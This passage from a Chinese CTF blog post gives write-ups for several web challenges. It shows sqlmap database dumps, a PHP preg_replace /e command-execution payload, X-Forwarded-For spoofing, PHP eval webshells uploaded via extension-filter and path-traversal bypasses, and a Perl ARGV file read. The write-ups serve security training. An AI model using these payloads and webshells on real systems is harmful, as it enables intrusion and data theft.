+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;http:&#x2F;&#x2F;111.198.29.45:51961&#x2F;findpwd.php&quot; --data&#x3D;&quot;username&#x3D;a&quot; --dbs&#x2F;&#x2F;爆出了四个库，经过尝试发现所要的数据在cetc004中</span><br><span class="line">sqlmap.py -u &quot;http:&#x2F;&#x2F;111.198.29.45:51961&#x2F;findpwd.php&quot; --data&#x3D;&quot;username&#x3D;a&quot; -D cetc004 --tables&#x2F;&#x2F;爆出user表</span><br><span class="line">sqlmap.py -u &quot;http:&#x2F;&#x2F;111.198.29.45:51961&#x2F;findpwd.php&quot; --data&#x3D;&quot;username&#x3D;a&quot; -D cetc004 -T user --columns&#x2F;&#x2F;爆出四个字段，answer，question，password，username</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/5.png" class="" title="examplename">
+
+<p>可以看到已经存在的账户信息，密码被加密了，未找到解密方法，回到注册和登录页面</p>
+<p>经过测试发现注册页面相同的账户名可以注册多次，登录界面同账户不同密码都可以成功登录</p>
+<p>注册一个名为c3tlwDmIn23的新账户登录就能拿到flag</p>
+<h4 id="0X05ics-05-20-03-14"><a href="#0X05ics-05-20-03-14" class="headerlink" title="0X05ics-05 20-03-14"></a>0X05ics-05 20-03-14</h4><p>拿到题目在<code>http://111.198.29.45:59907/index.php?page=1</code>发现注入点，看到到变量传参，有可能存在文件包含漏洞读取源码，又是php站，想到使用php伪协议读取源码</p>
+<p><code>http://111.198.29.45:59907/index.php?page=php://filter/read=convert.base64-encode/resource=index.php</code></p>
+<p>base64解密，整理一下源码，这里就只附上重点部分</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>] === <span class="string">'127.0.0.1'</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br &gt;Welcome My Admin ! &lt;br &gt;"</span>;</span><br><span class="line">    $pattern = $_GET[pat];</span><br><span class="line">    $replacement = $_GET[rep];</span><br><span class="line">    $subject = $_GET[sub];</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($pattern) &amp;&amp; <span class="keyword">isset</span>($replacement) &amp;&amp; <span class="keyword">isset</span>($subject)) &#123;</span><br><span class="line">        preg_replace($pattern, $replacement, $subject);</span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到首先是一个判断，也就是访问是否来自本机，用X-Forwarded-For进行伪造即可</p>
+<p>再来分析一下主题部分，通过get传入pattern、replacement、subject三个参数的值，通过preg_replace()函数，在subject找指定的pattern部分用replacement来进行替代</p>
+<p>通过查找资料了解了preg_replace函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">reg_replace 函数执行一个正则表达式的搜索和替换</span><br><span class="line">mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit &#x3D; -1 [, int &amp;$count ]] )</span><br><span class="line">搜索 subject 中匹配 pattern 的部分， 以 replacement 进行替换。</span><br><span class="line">• $pattern: 要搜索的模式，可以是字符串或一个字符串数组。</span><br><span class="line">• $replacement: 用于替换的字符串或字符串数组。</span><br><span class="line">• $subject: 要搜索替换的目标字符串或字符串数组。</span><br><span class="line">• $limit: 可选，对于每个模式用于每个 subject 字符串的最大可替换次数。 默认是-1（无限制）。</span><br><span class="line">• $count: 可选，为替换执行的次数。</span><br><span class="line">这个函数有个漏洞</span><br><span class="line">当$pattern使用了&#x2F;e修正符，替换的时候会把$replacement替换进去的代码当成php代码执行，当然要构成合法的php代码才能正确执行。</span><br></pre></td></tr></table></figure>
+
+<p>思路出来了，用burp抓包</p>
+<img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/6.png" class="" title="examplename">
+
+<p>可以看到页面成功回显了</p>
+<img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/7.png" class="" title="examplename">
+
+<p><code>index.php?pat=/test/e&amp;&amp;rep=system(&quot;ls&quot;)&amp;&amp;sub=test</code></p>
+<img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/8.png" class="" title="examplename">
+
+<p>下面一步需要注意，由于这里对空格进行了处理，可以用+或者%20来替代，“&amp;”用%26替代</p>
+<p><code>index.php?pat=/test/e&amp;&amp;rep=system(&quot;cd+s3chahahaDir%26%26+ls&quot;)&amp;&amp;sub=test</code></p>
+<img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/9.png" class="" title="examplename">
+
+<p><code>index.php?pat=/test/e&amp;&amp;rep=system(&quot;cd+s3chahahaDir/flag%26%26+ls&quot;)&amp;&amp;sub=test</code></p>
+<p>找到了flag.php文件，这里就不贴图了</p>
+<p>最后用cat来读取<code>index.php?pat=/test/e&amp;&amp;rep=system(&quot;cat+s3chahahaDir/flag/flag.php&quot;)&amp;&amp;sub=test</code></p>
+<h4 id="0X06Bug-20-03-15"><a href="#0X06Bug-20-03-15" class="headerlink" title="0X06Bug  20-03-15"></a>0X06Bug  20-03-15</h4><p>打开题目场景是一个登录界面，有注册和修改密码的选项，先注册一个账号登录上去看看</p>
+<img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/10.png" class="" title="examplename">
+
+<p>点击manage选项，无法打开，有弹窗提示：You are not admin,很明显需要管理员账号登录，但是注册时显示账号已存在，看来关键点在修改密码的页面，抓包，成功将user改成admin，再次登录，点击manage，提示Ip not Allowed,抓包，加上X-Forwarded-For:127.0.0.1,成功打开，没什么提示，查看网页源码，发现信息</p>
+<img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/11.png" class="" title="examplename">
+
+<p>根据提示传入参数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;111.198.29.45:39291&#x2F;index.php?module&#x3D;filemanage&amp;do&#x3D;1&#x2F;&#x2F;提示action is not correct</span><br><span class="line">尝试将do改成download，read，write，upload，最后发现时upload</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/12.png" class="" title="examplename">
+
+<p>接下来就是上传文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">在测试中发现有&lt;?php会报错，这就想到用php的脚本模式</span><br><span class="line">构造内容:</span><br><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;@eval($_POST[&quot;cmd&quot;])&lt;&#x2F;script&gt;以php后缀上传，burp抓包</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/13.png" class="" title="examplename">
+
+<p>根据提示尝试后缀名的绕过，在过程中发现对Content-Type有进行检测，将其改为image/jpeg，后缀名在已知的绕过方法中最后发现php4|php5可以，成功拿到flag</p>
+<h4 id="0X07ics-07-20-03-18"><a href="#0X07ics-07-20-03-18" class="headerlink" title="0X07ics-07 20-03-18"></a>0X07ics-07 20-03-18</h4><p>打开界面，发现项目管理页面有跳转，有view-source可以看源代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[id]) &amp;&amp; floatval($_GET[id]) !== <span class="string">'1'</span> &amp;&amp; substr($_GET[id], <span class="number">-1</span>) === <span class="string">'9'</span>) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="string">'config.php'</span>;</span><br><span class="line">        $id = mysql_real_escape_string($_GET[id]);</span><br><span class="line">        $sql=<span class="string">"select * from cetc007.user where id='$id'"</span>;</span><br><span class="line">        $result = mysql_query($sql);</span><br><span class="line">        $result = mysql_fetch_object($result);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $result = <span class="keyword">False</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(!$result)<span class="keyword">die</span>(<span class="string">"&lt;br &gt;something wae wrong ! &lt;br&gt;"</span>);</span><br><span class="line">      <span class="keyword">if</span>($result)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"id: "</span>.$result-&gt;id.<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"name:"</span>.$result-&gt;user.<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">        $_SESSION[<span class="string">'admin'</span>] = <span class="keyword">True</span>;</span><br><span class="line">      &#125;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">floatval($_GET[id]) !== <span class="string">'1'</span><span class="comment">//浮点数不能为1</span></span><br><span class="line">substr($_GET[id], <span class="number">-1</span>) === <span class="string">'9'</span>)<span class="comment">//id的倒数最后一个数为9</span></span><br><span class="line">mysql_real_escape_string（ ）函数会在单引号前加\依次来防止sql注入</span><br><span class="line"><span class="comment">//这里可以用1/9进行绕过</span></span><br></pre></td></tr></table></figure>
+
+<p>过了这一步来看下一段代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">     <span class="keyword">if</span> ($_SESSION[<span class="string">'admin'</span>]) &#123;</span><br><span class="line">       $con = $_POST[<span class="string">'con'</span>];</span><br><span class="line">       $file = $_POST[<span class="string">'file'</span>];</span><br><span class="line">       $filename = <span class="string">"backup/"</span>.$file;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span>(preg_match(<span class="string">'/.+\.ph(p[3457]?|t|tml)$/i'</span>, $filename))&#123;</span><br><span class="line">          <span class="keyword">die</span>(<span class="string">"Bad file extension"</span>);</span><br><span class="line">       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            chdir(<span class="string">'uploaded'</span>);</span><br><span class="line">           $f = fopen($filename, <span class="string">'w'</span>);</span><br><span class="line">           fwrite($f, $con);</span><br><span class="line">           fclose($f);</span><br><span class="line">       &#125;</span><br><span class="line">     &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">$filename = <span class="string">"backup/"</span>.$file;<span class="comment">//backup是伪路径，这里用../可以绕过</span></span><br><span class="line">preg_match(<span class="string">'/.+\.ph(p[3457]?|t|tml)$/i'</span>, $filename)<span class="comment">//这一段正则真的没看懂，看了大佬的wp说是只过滤在最后一个点的后缀，可以用/.或者两个.php文件来绕过</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:file=../<span class="number">4.</span>php/.&amp;con=<span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_GET[<span class="string">'cmd'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>访问uploaded/4.php</p>
+<img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/15.png" class="" title="examplename">
+
+<p>用system来爆出路径下的文件，可以看到有flag.php,用cat来读取，在网页源码可以看到flag</p>
+<p>还有一种方法是用菜刀连接，这里就不演示了</p>
+<img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/14.png" class="" title="examplename">
+
+<h4 id="0X08i-got-id-20-03-18"><a href="#0X08i-got-id-20-03-18" class="headerlink" title="0X08i-got-id 20-03-18"></a>0X08i-got-id 20-03-18</h4><p>打开有三个跳转链接，其中一个提示是Perl，有一个是文件上传页面，应该是Perl文件上传，去百度了以下有关的知识，猜测一下后台的逻辑</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> strict;</span><br><span class="line"><span class="keyword">use</span> warnings;</span><br><span class="line"><span class="keyword">use</span> CGI;</span><br><span class="line"><span class="keyword">my</span> $cgi=CGI-&gt;new;</span><br><span class="line"><span class="keyword">if</span>($cgi-&gt;upload(<span class="string">'file'</span>))&#123;</span><br><span class="line">	<span class="keyword">my</span> $file=$cgi-&gt;param(<span class="string">'file'</span>);</span><br><span class="line">		<span class="keyword">while</span> (&lt;$file&gt;)&#123;<span class="keyword">print</span> <span class="string">"$_"</span>;&#125;</span><br><span class="line">&#125;</span><br><span class="line">param()函数会返回一个列表的文件但是只有第一个文件会被放入到下面的file变量中。如果我们传入一个ARGV的文件，那么Perl会将传入的参数作为文件名读出来。对正常的上传文件进行修改,可以达到读取任意文件的目的</span><br></pre></td></tr></table></figure>
+
+<p>接下来上传一个argv文件再上传正常的文件，用bash来读取目录</p>
+<img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/16.png" class="" title="examplename">
+
+<p>接着直接读取/flag，就可以了</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/train/" rel="tag"># train</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/02/26/buuojdiary/" rel="prev" title="buuojdiary">
+      <i class="fa fa-chevron-left"></i> buuojdiary
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/03/14/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" rel="next" title="信息泄露">
+      信息泄露 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#0X01-FlatScience-20-03-11"><span class="nav-number">1.</span> <span class="nav-text">0X01: FlatScience 20-03-11</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0X02-shrine-20-03-12"><span class="nav-number">2.</span> <span class="nav-text">0X02:shrine 20-03-12</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0X03-fakebook-20-03-13"><span class="nav-number">3.</span> <span class="nav-text">0X03:fakebook 20-03-13</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0X04ics-04-20-03-14"><span class="nav-number">4.</span> <span class="nav-text">0X04ics-04 20-03-14</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0X05ics-05-20-03-14"><span class="nav-number">5.</span> <span class="nav-text">0X05ics-05 20-03-14</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0X06Bug-20-03-15"><span class="nav-number">6.</span> <span class="nav-text">0X06Bug  20-03-15</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0X07ics-07-20-03-18"><span class="nav-number">7.</span> <span class="nav-text">0X07ics-07 20-03-18</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0X08i-got-id-20-03-18"><span class="nav-number">8.</span> <span class="nav-text">0X08i-got-id 20-03-18</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Peguin</p>
+  <div class="site-description" itemprop="description">敢于去想，才会有MEteor的光芒闪耀。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">21</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">19</span>
+        <span class="site-state-item-name">tags</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Peguin</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
